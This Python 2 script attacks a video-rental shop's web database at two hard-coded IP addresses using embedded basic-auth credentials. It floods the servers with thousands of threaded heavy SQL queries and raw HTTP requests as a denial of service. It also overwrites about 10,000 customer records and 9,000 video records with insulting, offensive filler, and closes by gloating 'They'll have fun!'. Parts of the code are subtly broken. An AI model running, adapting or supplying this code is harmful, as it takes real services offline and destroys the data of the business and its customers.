#!/usr/bin/env python

from subprocess import call
from random import randint
import socket
import time
import threading
import requests
import itertools

SQL_QUERY_URL = ["http://85.214.224.63/storeAndRouteSQLQuery.php",
		 "http://130.73.201.41/storeAndRouteSQLQuery.php"]
SQL_AUTH = requests.auth.HTTPBasicAuth("leit", "tiel")
ADD_USER_POST_URL = ["http://85.214.224.63/adduser.php?domain=Anmeldung&used_table=kunden",
		"http://130.73.201.41/adduser.php?domain=Anmeldung&used_table=kunden"]
EDIT_USER_POST_URL = ["http://85.214.224.63/update2.php?domain=Anmeldung&used_table=kunden",
		"http://130.73.201.41/update2.php?domain=Anmeldung&used_table=kunden"]
ADD_USER_AUTH = requests.auth.HTTPBasicAuth("anme", "emna")
ADD_VIDEO_POST_URL = ["http://85.214.224.63/ein_search.php?domain=Einkauf",
		"http://130.73.201.41/ein_search.php?domain=Einkauf"]
EDIT_VIDEO_POST_URL = ["http://85.214.224.63/update_videos.php?domain=einkauf&used_table=videos%22",
		"http://130.73.201.41/update_videos.php?domain=einkauf&used_table=videos%22"]
ADD_VIDEO_AUTH = requests.auth.HTTPBasicAuth("eink", "knie")
SQL_QUERY = "sql_abfrage=SELECT+*+FROM+kunden%2C+videos%2C+ausleihe+WHERE+ausleihe.kunr+LIKE+%27%25{}%25%27+GROUP+BY+kunden.kustras++ORDER+BY+kunden.kuort&domain=Geschaeftsfuehrung&num=0&limit=10000&submit=Query+abschicken%21"

error_count = 0
addUser_count = 0
editUser_count = 0
addVideo_count = 0
editVideo_count = 0

thrds = []

def printStats():
	global addUser_count
	global editUser_count
	global addVideo_count
	global editVideo_count
	while getattr(threading.currentThread(), "do_run", True):
		time.sleep(5)
		print "[running]", addUser_count, "users added\t", editUser_count, "users edited\t", addVideo_count, "videos added\t", editVideo_count, "videos edited\t"

def sendSqlQuery(url):
	global error_count
	# random part of the query is to prevent server caching
	query = {'sql_abfrage': "SELECT * FROM kunden, videos, ausleihe WHERE"
		  "ausleihe.kunr LIKE '%{}%' GROUP BY kunden.kustras ORDER BY kunden.kuort".format(randint(0, 1000)),
		 'limit': 10000, 'domain': "Geschaeftsfuehrung"}
	try:
		response = requests.post(url, auth=SQL_AUTH, data=query, allow_redirects=False)
	except requests.exceptions.ConnectionError:
		error_count += 1
		if error_count % 100 == 0:
			print "[DoS]", error_count, "fails (the more, the better)"

def httpDos():
	for i in range(0, 10):
		socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			socket.connect(("130.73.201.41", 80))
			socket.send("GET " + 100 * SQL_QUERY + "HTTP/1.1\r\n")
			socket.sendto("GET " + 100 * SQL_QUERY + "HTTP/1.1\r\n", ("130.73.201.41", 80))
		except socket.error:
			pass # do nothing
		socket.close()

def addUser(lname, fname, street, postalCode, place, tel, born, sex, note):
	user = {'kuname': lname, 'kuvorna': fname, 'kustras': street, 'kuplz': postalCode,
		'kuort': place, 'kutel': tel, 'kugebdat': born, 'kusex': sex, 'kumerk': note}
	try:
		for url in ADD_USER_POST_URL:
			response = requests.post(url, auth=ADD_USER_AUTH, data=user, allow_redirects=False)

		global addUser_count
		addUser_count += 1
	except requests.exceptions.ConnectionError:
		addUser(lname, fname, street, postalCode, place, tel, born, sex, note)

def editUser(id, lname, fname, street, postalCode, place, tel, born, sex, note):
	user = {'kunr': id, 'kuname': lname, 'kuvorna': fname, 'kustras': street, 'kuplz': postalCode,
		'kuort': place, 'kutel': tel, 'kugebdat': born, 'kusex': sex, 'kumerk': note}
	try:
		for url in EDIT_USER_POST_URL:
			response = requests.post(url, auth=ADD_USER_AUTH, data=user, allow_redirects=False)

		global editUser_count
		editUser_count += 1
	except requests.exceptions.ConnectionError:
		editUser(id, lname, fname, street, postalCode, place, tel, born, sex, note)

def addVideo(title = "", director = "", genre = "", length = "", fsk = "", description = "", role1 = "", role2 = "", role3 = ""):
	video = {'domain': 'Einkauf', 'vinr': '', 'start': '', 'vititel': title,
		'viregie': director, 'viart': genre, 'vidauer': length, 'vifsk': fsk,
		'viinhalt': description, 'vidarsteller1': role1, 'vidarsteller2': role2,
		'vidarsteller3': role3}
	try:
		for url in ADD_VIDEO_POST_URL:
			response = requests.post(url, auth=ADD_VIDEO_AUTH, data=video, allow_redirects=False)

		global addVideo_count
		addVideo_count += 1
	except requests.exceptions.ConnectionError:
		addVideo(title = title, director = director, genre = genre, length = length, fsk = fsk, description = description, role1 = role1, role2 = role2, role3 = role3)

def editVideo(id, title = "", director = "", genre = "", length = "", fsk = "",
		description = "", role1 = "", role2 = "", role3 = ""):
	video = {'vinr': id, 'vititel': title, 'viregie': director, 'viart': genre,
		'vidauer': length, 'vifsk': fsk, 'viinhalt': description,
		'vidarsteller1': role1, 'vidarsteller2': role2, 'vidarsteller3': role3}
	try:
		for url in EDIT_VIDEO_POST_URL:
			response = requests.post(url, auth=ADD_VIDEO_AUTH, data=video, allow_redirects=False)

		global editVideo_count
		editVideo_count += 1
	except requests.exceptions.ConnectionError:
		editVideo(id, title = title, director = director, genre = genre, length = length, fsk = fsk, description = description, role1 = role1, role2 = role2, role3 = role3)


def addFrikas(letters):
	for i in range(4,5):
		for j in map(''.join, itertools.product(letters, repeat=i)):
			addUser("xXDaiMuddahHDXx {}".format(j), "Imperator", "ne lass mal", "12345", "Poofingen an der Zichte", "666", "1933-01-31", "w", "Diese Person ist gefaehrlich, halten sie sie von Essen fern!")

def editUsers(minrange, maxrange):
	for i in range(minrange, maxrange):
		editUser(i, "xXDaiMuddahHDXx {}".format(i), "Imperator", "ne lass mal", "12345", "Poofingen an der Zichte", "666", "1933-01-31", "w", "Diese Person ist gefaehrlich, halten sie sie von Essen fern!")

def videoSpam(minrange, maxrange):
	for i in range(minrange, maxrange):
		addVideo(title = "DaiMuddah geht shoppen Teil {}".format(i), director = "Til Schweiger", genre = "Fettsucht hoch {}".format(i/7), length = str(randint(1, 180)), fsk = "18", description = "Verstoerenede Bilder - empfohlen ab 35 Jahren", role1 = "DaiMuddah", role2 = "Til Schweiger", role3 = "Felix von den Laeden")

def editVideos(minrange, maxrange):
	for i in range(minrange, maxrange):
		editVideo(i, title = "DaiMuddah geht shoppen Teil {}".format(i), director = "Til Schweiger", genre = "Fettsucht hoch {}".format(i/7), length = str(randint(1, 180)), fsk = "18", description = "Verstoerenede Bilder - empfohlen ab 35 Jahren", role1 = "DaiMuddah", role2 = "Til Schweiger", role3 = "Felix von den Laeden")

def sqlAttack():
	for y in range(0, 10):
		for i in range(0, 1000):
			for url in SQL_QUERY_URL:
				x = threading.Thread(target=sendSqlQuery, args=(url,))
				thrds.append(x)
				x.start()
		for x in thrds:
			x.join()

		print("1.000 Threads finished")

def entryAttack():
	print "Editing database ..."
	statT = threading.Thread(target=printStats)
	statT.start()

	#for letters in ["fuck", "magic", "http", "api"]:
		#t = Thread(target=addFrikas, args=(letters,))
		#thrds.append(t)
		#t.start()
	for i in range(0, 4):
		i = float(i)
		t = threading.Thread(target=editUsers, args=(int(i/4 * 10000), int((i+1)/4 * 10000 - 1)))
		thrds.append(t)
		t.start()
	#for i in range(0, 2):
		#t = Thread(target=videoSpam, args=(i * 200, i * 200 + 200))
		#thrds.append(t)
		#t.start()
	for i in range(0, 4):
		i = float(i)
		t = threading.Thread(target=editVideos, args=(int(i/4 * 9000), int((i+1)/5 * 9000 - 1)))
		thrds.append(t)
		t.start()
	for t in thrds:
		t.join()
	
	statT.do_run = False
	statT.join()
	print "Finished! They'll have fun!"
